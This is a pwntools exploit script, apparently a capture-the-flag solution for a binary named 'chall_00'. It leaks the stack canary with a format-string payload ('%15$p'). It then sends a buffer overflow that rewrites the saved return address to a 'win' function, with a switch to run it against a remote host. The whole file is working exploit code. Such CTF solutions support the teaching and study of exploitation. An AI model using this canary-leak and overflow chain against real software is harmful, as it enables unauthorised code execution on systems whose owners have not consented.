#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chall_00")

gs = '''
b main
b *main+141
b *main+213
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Addresses

# Functions

io = start()

p = b"%15$p"
io.sendafter(b">>", p)
io.recvline()
can = io.recvline()
can = can[2:2+16]
can = int(can, 16)
log.info("Canary: %s"%hex(can))

p = b"A"*72
p += p64(can)
p += b"B"*8 # rbp
p += p64(elf.sym['win'])

io.sendafter(b">>", p)


io.interactive()
